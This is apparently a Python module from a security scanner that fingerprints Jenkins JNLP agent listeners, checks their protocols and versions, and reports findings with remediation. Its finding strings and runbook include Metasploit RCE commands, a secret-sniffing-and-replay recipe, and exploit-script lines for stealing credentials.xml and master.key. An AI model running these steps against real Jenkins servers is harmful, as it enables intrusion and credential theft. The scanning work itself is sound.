"""Jenkins JNLP agent-listener probe.

Jenkins controllers accept build-agent connections on a dedicated TCP port
(default 50000/tcp, configurable). The listener speaks a small text
protocol whose supported transports change over Jenkins' lifetime:

  * PROTOCOL_JNLP-connect   — v1, plaintext + SHA-hashed secret (deprecated)
  * PROTOCOL_JNLP2-connect  — plaintext channel with HMAC-SHA-256 auth
  * PROTOCOL_JNLP3-connect  — SHA + AES-encrypted channel
  * PROTOCOL_JNLP4-connect  — TLS-wrapped, current default
  * PROTOCOL_CLI-connect / PROTOCOL_CLI2-connect — legacy CLI over the agent
    port, removed in 2.54+ but still enabled on many long-lived controllers.

Findings emitted:
  * jnlp_reachable                  (medium)   raw TCP reach from scan segment
  * jnlp_legacy_protocols           (high)     JNLP<4 or CLI-* still enabled
  * jnlp_plaintext_agent_channel    (high)     JNLP1/JNLP2 (secrets cleartext)
  * jnlp_cli2_deser_rce             (critical) CLI2-connect → CVE-2017-1000353
  * jenkins_agent_listener_discovered (high)   sibling HTTP /tcpSlaveAgent...
                                              disclosed protocols / port /
                                              instance identity
  * jenkins_controller_identity     (medium)   X-Instance-Identity SHA-256
                                              (SPKI-bytes fingerprint)
  * jnlp_version_propagation        (info)     Jenkins version copied from
                                              HTTP twin onto the agent Port
                                              record so the CVE mapper fires
  * jnlp_cve_2024_43044             (critical) controller version < 2.470 or
                                              LTS < 2.452.3 → agent→controller
                                              arbitrary file read

Airgap-safe: stdlib socket + http.client + hashlib only. Every socket op
is bounded through proxy.scaled().
"""
from __future__ import annotations

import base64
import hashlib
import http.client
import re
import socket
import struct

from ..core import proxy
from ..core.models import Host, Port


_DEFAULT_PORT = 50000
_TIMEOUT = 4.0
_READ_CAP = 8192

# Protocol names the Jenkins TcpSlaveAgentListener has ever advertised.
_KNOWN_PROTOCOLS = (
    "JNLP-connect", "JNLP2-connect", "JNLP3-connect", "JNLP4-connect",
    "CLI-connect", "CLI2-connect", "Ping",
)
_LEGACY_JNLP = ("JNLP-connect", "JNLP2-connect", "JNLP3-connect")
_PLAINTEXT_JNLP = ("JNLP-connect", "JNLP2-connect")
_LEGACY_CLI = ("CLI-connect", "CLI2-connect")

_JNLP_TEXT_RE = re.compile(
    r"PROTOCOL_JNLP|PROTOCOL_CLI|Protocol:JNLP|Jenkins-Agent-Protocols|"
    r"Jenkins-Version|not understood|Unknown protocol",
    re.IGNORECASE)
_DRDA_MAGIC = 0xD0

_HTTP_PORT_HINTS = (8080, 80, 8081, 8443, 443, 8000, 8180, 9090, 50080)


def is_jenkins_jnlp(port: Port) -> bool:
    """Passive classifier. Port 50000 alone is NOT enough - it collides with
    IBM Db2 - so the active disambiguator's cached verdict wins when present.
    The svcdetect fingerprint (jnlp-agent) and the extrainfo tag set by
    disambiguate() are the strong signals; the port number is the weak fallback
    only when a servicefp / product / banner already smells like Jenkins."""
    svc = (port.service or "").lower()
    prod = (port.product or "").lower()
    xinfo = (port.extrainfo or "").lower()
    banner = (port.banner or "").lower()
    fp = (port.servicefp or "")
    # Strong: a positive JNLP tag (from disambiguate() or svcdetect) always wins.
    if "jnlp" in xinfo or "jnlp" in svc or "jnlp" in banner:
        return True
    if "jenkins" in svc or "jenkins" in prod or "jenkins" in banner:
        return True
    if _JNLP_TEXT_RE.search(fp) or _JNLP_TEXT_RE.search(banner):
        return True
    # Weak: port number alone. Only when we have no counter-signal from Db2.
    if port.portid == _DEFAULT_PORT:
        if "db2" in svc or "drda" in svc or "db2" in prod:
            return False
        return True
    return False


# --- disambiguator ---------------------------------------------------------

def disambiguate(ip: str, port: int = _DEFAULT_PORT,
                 timeout: float = _TIMEOUT) -> dict:
    """Resolve the 50000/tcp collision with Db2/DRDA.

    Open TCP, send b'\\r\\n', read up to 128 bytes. A Jenkins JNLP listener
    replies with ASCII text (Protocol / Jenkins / Unknown protocol); a Db2
    DRDA endpoint replies with a DSS frame whose third byte is 0xD0. Returns
    {reachable, service, banner, error} — service in ('jnlp', 'db2', 'unknown').
    """
    out: dict = {"reachable": False, "service": "unknown", "banner": "",
                 "error": ""}
    t = proxy.scaled(timeout)
    try:
        with socket.create_connection((ip, port), timeout=t) as s:
            s.settimeout(t)
            out["reachable"] = True
            try:
                s.sendall(b"\r\n")
            except OSError as e:
                out["error"] = f"send: {e}"
                return out
            try:
                data = s.recv(128)
            except (socket.timeout, OSError) as e:
                out["error"] = f"recv: {e}"
                return out
    except OSError as e:
        out["error"] = str(e)
        return out
    if not data:
        return out
    out["banner"] = data[:120].decode("latin-1", "replace")
    if len(data) >= 3 and data[2] == _DRDA_MAGIC:
        out["service"] = "db2"
        return out
    text = data.decode("latin-1", "replace")
    if _JNLP_TEXT_RE.search(text):
        out["service"] = "jnlp"
    return out


# --- protocol negotiation --------------------------------------------------

def _parse_protocols(text: str) -> list[str]:
    """Extract JNLP/CLI protocol names from an error listing or a comma-
    separated Jenkins-Agent-Protocols header. Returns a de-duplicated
    ordered list of the known names actually present."""
    found: list[str] = []
    seen: set[str] = set()
    for name in _KNOWN_PROTOCOLS:
        pat = re.compile(r"\b(?:PROTOCOL_)?" + re.escape(name) + r"\b")
        if pat.search(text) and name not in seen:
            found.append(name)
            seen.add(name)
    return found


def negotiate_protocols(ip: str, port: int = _DEFAULT_PORT,
                        timeout: float = _TIMEOUT) -> dict:
    """Trigger the controller's 'supported protocols' error listing by sending
    a length-prefixed unknown protocol name. Also tolerates the older raw
    'Protocol:X\\n' form. Returns {reachable, protocols, raw, error}."""
    out: dict = {"reachable": False, "protocols": [], "raw": "", "error": ""}
    unknown = b"Protocol:PROTOCOL_INVALID\n"
    # Length-prefixed (modern) then raw (legacy) — try both so the fallback
    # covers Jenkins versions that reject one framing or the other. We send
    # both on the same connection: the server closes after its error line, so
    # only the first that gets bytes back matters.
    payload = struct.pack(">I", len(unknown) - 1) + unknown + unknown
    t = proxy.scaled(timeout)
    try:
        with socket.create_connection((ip, port), timeout=t) as s:
            s.settimeout(t)
            out["reachable"] = True
            try:
                s.sendall(payload)
            except OSError as e:
                out["error"] = f"send: {e}"
                return out
            chunks: list[bytes] = []
            total = 0
            try:
                while total < _READ_CAP:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    chunks.append(chunk)
                    total += len(chunk)
            except (socket.timeout, OSError):
                pass
    except OSError as e:
        out["error"] = str(e)
        return out
    raw = b"".join(chunks).decode("latin-1", "replace")
    out["raw"] = raw[:1024]
    out["protocols"] = _parse_protocols(raw)
    return out


# --- HTTP sibling probe (/tcpSlaveAgentListener/) --------------------------

def _http_ports(host: Host) -> list[tuple[int, bool]]:
    """(port, use_tls) candidates from the host's open ports where a Jenkins
    HTTP controller might live, in probe-order."""
    seen: set[tuple[int, bool]] = set()
    out: list[tuple[int, bool]] = []

    def _add(pid: int, tls: bool):
        key = (pid, tls)
        if key in seen:
            return
        seen.add(key)
        out.append(key)

    for p in host.open_ports:
        svc = (p.service or "").lower()
        prod = (p.product or "").lower()
        banner = (p.banner or "").lower()
        looks_web = ("http" in svc or svc in ("https", "http-alt", "http-proxy",
                                              "www", "http-mgmt"))
        looks_jenkins = ("jenkins" in svc or "jenkins" in prod
                         or "jenkins" in banner)
        if not (looks_web or looks_jenkins or p.portid in _HTTP_PORT_HINTS):
            continue
        tls = ("https" in svc or svc == "wsmans" or p.tunnel == "ssl"
               or p.portid in (443, 8443))
        _add(p.portid, tls)
    return out


def _http_get(ip: str, port: int, path: str, tls: bool,
              timeout: float) -> tuple[int, dict, bytes] | None:
    """One GET, follow zero redirects, return (status, headers, body) or None.
    All I/O is bounded through proxy.scaled()."""
    t = proxy.scaled(timeout)
    conn = None
    try:
        if tls:
            import ssl
            ctx = ssl._create_unverified_context()
            conn = http.client.HTTPSConnection(ip, port, timeout=t, context=ctx)
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=t)
        conn.request("GET", path, headers={"User-Agent": "recce/jnlp-probe",
                                           "Accept": "*/*"})
        r = conn.getresponse()
        body = r.read(_READ_CAP)
        headers = {k.lower(): v for k, v in r.getheaders()}
        return r.status, headers, body
    except (OSError, http.client.HTTPException, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def _spki_fingerprint(pem_b64: str) -> str:
    """SHA-256 of the raw base64-decoded X-Instance-Identity bytes (that value
    is the DER SubjectPublicKeyInfo Jenkins publishes). Returns hex or ''."""
    if not pem_b64:
        return ""
    try:
        der = base64.b64decode(pem_b64.strip(), validate=False)
    except (ValueError, TypeError):
        return ""
    if not der:
        return ""
    return hashlib.sha256(der).hexdigest()


def http_sibling(host: Host, timeout: float = _TIMEOUT) -> dict:
    """Fetch /tcpSlaveAgentListener/ on every likely HTTP port on the host.
    Returns the first hit's parsed metadata, or an empty result. Keys:
      {found, http_port, tls, jenkins_version, agent_port, protocols,
       instance_identity_b64, instance_identity_fp, url}"""
    out: dict = {"found": False, "http_port": 0, "tls": False,
                 "jenkins_version": "", "agent_port": 0,
                 "protocols": [], "instance_identity_b64": "",
                 "instance_identity_fp": "", "url": ""}
    for port, tls in _http_ports(host):
        r = _http_get(host.ip, port, "/tcpSlaveAgentListener/", tls, timeout)
        if r is None:
            continue
        status, headers, _body = r
        # A live Jenkins TcpSlaveAgentListener answers 200 (some proxies wrap
        # it in 404 while still forwarding the X-Jenkins headers), so we
        # trust the header set over the status code.
        if not any(h.startswith("x-jenkins") or h == "x-hudson-cli-port"
                   or h == "x-instance-identity"
                   for h in headers):
            continue
        out["found"] = True
        out["http_port"] = port
        out["tls"] = tls
        out["url"] = (("https" if tls else "http")
                      + f"://{host.ip}:{port}/tcpSlaveAgentListener/")
        out["jenkins_version"] = (headers.get("x-jenkins", "")
                                  or headers.get("x-hudson", "")).strip()
        agent_port = (headers.get("x-jenkins-cli-port", "")
                      or headers.get("x-hudson-jnlp-port", "")
                      or headers.get("x-hudson-cli-port", "")).strip()
        if agent_port.isdigit():
            out["agent_port"] = int(agent_port)
        protos_hdr = (headers.get("x-jenkins-agent-protocols", "")
                      or headers.get("x-hudson-agent-protocols", "")).strip()
        if protos_hdr:
            out["protocols"] = _parse_protocols(protos_hdr)
        ident = headers.get("x-instance-identity", "").strip()
        if ident:
            out["instance_identity_b64"] = ident
            out["instance_identity_fp"] = _spki_fingerprint(ident)
        _, status_code = r[0], status  # noqa: F841 - keep status noted
        return out
    return out


# --- version comparison ----------------------------------------------------

_VER_RE = re.compile(r"(\d+)(?:\.(\d+))?(?:\.(\d+))?")


def _parse_ver(s: str) -> tuple[int, int, int] | None:
    if not s:
        return None
    m = _VER_RE.search(s)
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2) or 0), int(m.group(3) or 0))


def _lt(a: tuple[int, int, int], b: tuple[int, int, int]) -> bool:
    return a < b


def _is_lts(v: tuple[int, int, int]) -> bool:
    """Jenkins LTS lines have a non-zero PATCH; weekly releases don't. E.g.
    2.452.3 = LTS; 2.470 or 2.470.0 = weekly. Not a perfect test — a weekly
    release named exactly x.y.0 is indistinguishable from an LTS x.y.0 that
    happens to be its own base — but recce only uses this to pick the RIGHT
    CVE fix-version cutoff, and both cutoffs are conservative."""
    return v[2] != 0


def cve_2024_43044_vulnerable(version: str) -> bool:
    """CVE-2024-43044 (SECURITY-3430) fixed in weekly 2.471 and LTS 2.452.3."""
    v = _parse_ver(version)
    if not v:
        return False
    if _is_lts(v):
        return _lt(v, (2, 452, 3))
    return _lt(v, (2, 471, 0))


def cve_2017_1000353_vulnerable(version: str) -> bool:
    """CVE-2017-1000353 fixed in weekly 2.57 and LTS 2.46.2."""
    v = _parse_ver(version)
    if not v:
        return False
    if _is_lts(v):
        return _lt(v, (2, 46, 2))
    return _lt(v, (2, 57, 0))


# --- probe / targets -------------------------------------------------------

def jnlp_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_jenkins_jnlp(p):
                out.append({"ip": h.ip, "port": p.portid, "host": h,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
          host: Host | None = None) -> dict:
    """Full JNLP probe: disambiguate → negotiate protocols → optional HTTP
    sibling fetch when a host object is supplied. Returns a merged dict."""
    out: dict = {"reachable": False, "is_jnlp": False, "banner": "",
                 "protocols": [], "legacy_jnlp": [], "plaintext_jnlp": [],
                 "cli_legacy": [], "http_sibling": {}, "version": "",
                 "instance_identity_fp": "", "error": ""}
    dis = disambiguate(ip, port, timeout=timeout)
    out["reachable"] = dis["reachable"]
    out["banner"] = dis["banner"]
    if not dis["reachable"]:
        out["error"] = dis["error"]
        return out
    if dis["service"] == "db2":
        out["error"] = "endpoint identified as Db2/DRDA, not Jenkins JNLP"
        return out
    # jnlp OR unknown — continue with negotiation; only mark is_jnlp once
    # we get a positive text hit.
    if dis["service"] == "jnlp":
        out["is_jnlp"] = True
    neg = negotiate_protocols(ip, port, timeout=timeout)
    if neg["protocols"]:
        out["is_jnlp"] = True
    out["protocols"] = neg["protocols"]
    out["legacy_jnlp"] = [p for p in neg["protocols"] if p in _LEGACY_JNLP]
    out["plaintext_jnlp"] = [p for p in neg["protocols"] if p in _PLAINTEXT_JNLP]
    out["cli_legacy"] = [p for p in neg["protocols"] if p in _LEGACY_CLI]
    if host is not None:
        sib = http_sibling(host, timeout=timeout)
        if sib["found"]:
            out["http_sibling"] = sib
            out["version"] = sib["jenkins_version"]
            out["instance_identity_fp"] = sib["instance_identity_fp"]
            # Fold the HTTP-advertised protocol set in when the raw TCP probe
            # got nothing (a controller behind a strict firewall on the agent
            # port may still expose the listener metadata over HTTP).
            if sib["protocols"] and not out["protocols"]:
                out["protocols"] = sib["protocols"]
                out["legacy_jnlp"] = [p for p in sib["protocols"]
                                      if p in _LEGACY_JNLP]
                out["plaintext_jnlp"] = [p for p in sib["protocols"]
                                         if p in _PLAINTEXT_JNLP]
                out["cli_legacy"] = [p for p in sib["protocols"]
                                     if p in _LEGACY_CLI]
                out["is_jnlp"] = True
    return out


# --- findings --------------------------------------------------------------

def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "nc", "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_jenkins_jnlp(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            if not pr.get("is_jnlp"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            protos = pr.get("protocols") or []
            sib = pr.get("http_sibling") or {}
            version = pr.get("version") or ""

            # Legacy protocols (any of JNLP<4 / CLI / CLI2).
            legacy = pr.get("legacy_jnlp") or []
            cli_leg = pr.get("cli_legacy") or []
            if legacy or cli_leg:
                names = ", ".join(sorted(set(legacy + cli_leg)))
                out.append(_finding(
                    "high", "Jenkins JNLP legacy protocols enabled", tgt,
                    f"The controller advertises legacy agent protocols: "
                    f"{names}. Modern Jenkins ships with only JNLP4-connect "
                    f"enabled; the presence of JNLP1/2/3 or CLI/CLI2 means "
                    f"Configure Global Security still permits the old "
                    f"transports. JNLP1/2 send the agent secret in cleartext; "
                    f"JNLP3's AES layer is still susceptible to on-path replay.",
                    f"printf 'Protocol:PROTOCOL_INVALID\\n' | nc {h.ip} {p.portid}",
                    "In Manage Jenkins → Configure Global Security → Agents, "
                    "select 'Random' or a fixed port and enable ONLY "
                    "JNLP4-connect. Disable inbound CLI over the agent port.",
                    ["CWE-327"], kind="jnlp_legacy_protocols",
                    exploit_note=(
                        "Use jenkins-jnlp-agent.jar or a scapy-scripted JNLP1 "
                        "handshake with a captured secret; confirm the "
                        "controller accepts."),
                    depth_tier="t1"))

            # Plaintext JNLP1/2 — secrets on the wire.
            plain = pr.get("plaintext_jnlp") or []
            if plain:
                out.append(_finding(
                    "high",
                    "Jenkins JNLP plaintext agent channel (secret on wire)", tgt,
                    f"{', '.join(plain)} is enabled. The agent's 64-hex "
                    f"secret and node name transit the wire in cleartext on "
                    f"every reconnect. An on-path attacker on the agent LAN "
                    f"harvests them passively and replays them against this "
                    f"controller (or feeds them into an offline HMAC-SHA-256 "
                    f"cracker for the underlying secret).",
                    f"printf 'Protocol:PROTOCOL_INVALID\\n' | nc {h.ip} {p.portid}",
                    "Disable JNLP-connect and JNLP2-connect in Manage Jenkins "
                    "→ Configure Global Security → Agents. Require "
                    "JNLP4-connect (TLS-wrapped).",
                    ["CWE-319"], kind="jnlp_plaintext_agent_channel",
                    exploit_note=(
                        "tcpdump -i any -A 'tcp port 50000' — wait for an "
                        "agent reconnect; grep for 64-hex secret. Replay via "
                        "jenkins-jnlp-agent.jar with that secret + captured "
                        "node name."),
                    depth_tier="t1"))

            # CLI2 deserialization → CVE-2017-1000353.
            if "CLI2-connect" in cli_leg or "CLI-connect" in cli_leg:
                cve_ids = ["CVE-2017-1000353"]
                out.append(_finding(
                    "critical",
                    "Jenkins CLI over agent port (CVE-2017-1000353 "
                    "pre-auth Java deserialization RCE)", tgt,
                    f"The controller accepts PROTOCOL_{cli_leg[0]} over the "
                    f"agent port. Legacy Jenkins CLI over the agent listener "
                    f"is a pre-auth Java object-deserialization sink "
                    f"(CVE-2017-1000353): sending a crafted CLI2 upload "
                    f"triggers ObjectInputStream on attacker-controlled bytes "
                    f"before authentication runs. Fixed in Jenkins 2.46.2 "
                    f"(LTS) / 2.57 (weekly).",
                    f"msfconsole -q -x 'use exploit/linux/misc/"
                    f"jenkins_command_receive; set RHOSTS {h.ip}; "
                    f"set RPORT {p.portid}; run'",
                    "Upgrade to Jenkins ≥ 2.46.2 LTS / ≥ 2.57 weekly. On "
                    "modern Jenkins, disable inbound CLI over the agent "
                    "listener entirely (it is off by default since 2.54).",
                    ["CWE-502"], kind="jnlp_cli2_deser_rce",
                    exploit_note=(
                        "msfconsole -q -x 'use exploit/linux/misc/"
                        "jenkins_command_receive; set RHOSTS <ip>; set RPORT "
                        "50000; set LHOST <lhost>; run' — then whoami/id, "
                        "exfil credentials.xml + master.key."),
                    depth_tier="t1"))
                # Enrich with structured CVE ids for the vuln mapper.
                out[-1]["cves"] = cve_ids

            # HTTP sibling metadata discovered.
            if sib.get("found"):
                bits = []
                if sib.get("jenkins_version"):
                    bits.append(f"X-Jenkins={sib['jenkins_version']}")
                if sib.get("agent_port"):
                    bits.append(f"X-Hudson-JNLP-Port={sib['agent_port']}")
                if sib.get("protocols"):
                    bits.append("X-Jenkins-Agent-Protocols="
                                + ",".join(sib["protocols"]))
                if sib.get("instance_identity_fp"):
                    bits.append("X-Instance-Identity="
                                + sib["instance_identity_fp"][:16] + "…")
                detail = (f"GET {sib.get('url','')} disclosed: "
                          + " · ".join(bits) if bits else
                          f"GET {sib.get('url','')} responded with Jenkins "
                          f"agent-listener metadata headers.")
                out.append(_finding(
                    "high",
                    "Jenkins /tcpSlaveAgentListener/ metadata disclosed", tgt,
                    detail,
                    f"curl -sk -I {sib.get('url','')}",
                    "Restrict access to /tcpSlaveAgentListener/ or bind the "
                    "controller to a management-only interface. The endpoint "
                    "is unauthenticated by design so the discovery it enables "
                    "is a network-segmentation control, not a Jenkins toggle.",
                    ["CWE-200"], kind="jenkins_agent_listener_discovered",
                    exploit_note=(
                        "curl -sk http://<ip>:8080/tcpSlaveAgentListener/ -I; "
                        "then curl -sk http://<ip>:8080/asynchPeople/api/json "
                        "(unauth user list on many installs)."),
                    depth_tier="t1"))

            # X-Instance-Identity fingerprint.
            fp = pr.get("instance_identity_fp") or ""
            if fp:
                out.append(_finding(
                    "medium",
                    "Jenkins controller identity (X-Instance-Identity SPKI "
                    "fingerprint) captured", tgt,
                    f"SHA-256 of the controller's X-Instance-Identity public "
                    f"key = {fp}. Uniquely IDs one Jenkins controller across "
                    f"scans / ports / IP changes — the same value shows up on "
                    f"every port the controller listens on and on every agent "
                    f"that trusts it. Use to correlate multi-subnet scans and "
                    f"to attribute a captured agent secret to the right "
                    f"controller.",
                    f"curl -sk -I {sib.get('url','') or f'http://{h.ip}/'}",
                    "Informational — the value is unauthenticated by design "
                    "(Jenkins publishes it so agents can pin the controller).",
                    [], kind="jenkins_controller_identity"))

            # Version cross-link from HTTP twin onto the agent Port record.
            if version and not (p.product and p.version):
                out.append(_finding(
                    "info",
                    "Jenkins version propagated from HTTP twin onto agent port",
                    tgt,
                    f"HTTP sibling on {sib.get('http_port','?')} disclosed "
                    f"Jenkins version {version}. Agent-port CVE mapping "
                    f"(CVE-2017-1000353, CVE-2024-43044) now fires against "
                    f"this port too.",
                    "",
                    "Informational — pairs with any version-keyed CVE finding.",
                    [], kind="jnlp_version_propagation"))

            # CVE-2024-43044 (agent → controller arbitrary file read).
            if version and cve_2024_43044_vulnerable(version):
                out.append(_finding(
                    "critical",
                    "Jenkins agent→controller file-read (CVE-2024-43044)", tgt,
                    f"Controller version {version} is < 2.471 weekly / < "
                    f"2.452.3 LTS. A compromised agent (or anyone completing "
                    f"the JNLP handshake, per SECURITY-3430) can invoke "
                    f"ClassLoaderProxy#fetchJar with arbitrary paths on the "
                    f"CONTROLLER filesystem — arbitrary file-read against "
                    f"JENKINS_HOME (secrets, credentials.xml, master.key).",
                    f"# authenticated agent → fetchJar on /etc/passwd via "
                    f"the remoting channel to {h.ip}:{p.portid}",
                    "Upgrade to Jenkins ≥ 2.471 weekly / ≥ 2.452.3 LTS "
                    "(SECURITY-3430 fix). Interim: bind the agent port to a "
                    "management VLAN only agents can reach.",
                    ["CWE-22"], kind="jnlp_cve_2024_43044",
                    exploit_note=(
                        "python3 jenkins_43044_exploit.py --host <ip> --port "
                        "50000 --agent <name> --secret <64hex> --file "
                        "/var/lib/jenkins/secrets/master.key — extract, then "
                        "decrypt credentials.xml offline."),
                    depth_tier="t0",
                ))
                out[-1]["cves"] = ["CVE-2024-43044"]

            # Version-gated CVE-2017-1000353 (fires even without CLI2 in the
            # negotiated set — an old controller may have CLI2 enabled through
            # a rare configuration and version alone is enough evidence for
            # the CVE mapper to flag it).
            if version and cve_2017_1000353_vulnerable(version) and not cli_leg:
                out.append(_finding(
                    "critical",
                    "Jenkins < 2.46.2/2.57 (CVE-2017-1000353 pre-auth "
                    "deserialization RCE)", tgt,
                    f"Controller version {version} is < 2.46.2 LTS / < 2.57 "
                    f"weekly. Any exposure of the legacy CLI over the agent "
                    f"port (default on this era) is a pre-auth Java object-"
                    f"deserialization RCE.",
                    f"msfconsole -q -x 'use exploit/linux/misc/"
                    f"jenkins_command_receive; set RHOSTS {h.ip}; "
                    f"set RPORT {p.portid}; run'",
                    "Upgrade to Jenkins ≥ 2.46.2 LTS / ≥ 2.57 weekly.",
                    ["CWE-502"], kind="jnlp_cve_2017_1000353",
                    exploit_note=(
                        "msfconsole exploit/linux/misc/"
                        "jenkins_command_receive — same as CLI2 finding."),
                    depth_tier="t0",
                ))
                out[-1]["cves"] = ["CVE-2017-1000353"]

            # Baseline network-exposure finding — always emit last.
            out.append(_finding(
                "medium", "Jenkins JNLP agent listener reachable", tgt,
                f"Agent port answered a JNLP-style negotiation from a scan "
                f"segment. Jenkins docs recommend the agent port be "
                f"reachable only from agent hosts. Negotiated protocol set: "
                f"{', '.join(protos) if protos else '(none returned)'}."
                + (f" Controller version: {version}." if version else ""),
                f"printf 'Protocol:PROTOCOL_INVALID\\n' | nc {h.ip} {p.portid}",
                "Firewall the agent port to the agent network only; disable "
                "legacy JNLP<4 and CLI-over-agent protocols.",
                ["CWE-668"], kind="jnlp_reachable"))
    return out


# --- runbook / vulns / analyze --------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    return [
        {"step": "Dump the supported-protocols listing",
         "cmd": f"printf 'Protocol:PROTOCOL_INVALID\\n' | nc {ip} {port}"},
        {"step": "Fetch the HTTP sibling listener metadata (identify version, "
                 "protocols, real agent port)",
         "cmd": f"curl -sk -I http://{ip}:8080/tcpSlaveAgentListener/"},
        {"step": "Nmap version probe on the agent port",
         "cmd": f"nmap -sV -p{port} --version-all {ip}"},
        {"step": "Metasploit CLI2 deserialization (CVE-2017-1000353) — "
                 "only when CLI2-connect is negotiated",
         "cmd": (f"msfconsole -q -x 'use exploit/linux/misc/"
                 f"jenkins_command_receive; set RHOSTS {ip}; "
                 f"set RPORT {port}; run'")},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "jenkins_jnlp", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = jnlp_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets,
                lambda t: probe(t["ip"], t["port"], host=t.get("host")),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["is_jnlp"] = pr.get("is_jnlp", False)
                t["protocols"] = list(pr.get("protocols") or [])
                if pr.get("version"):
                    t["version"] = pr["version"]
    fs = findings(hosts, probes)
    # Drop the transient Host object off targets before returning — it is not
    # JSON-serializable and the CLI layer copies these dicts straight into
    # its report row.
    for t in targets:
        t.pop("host", None)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
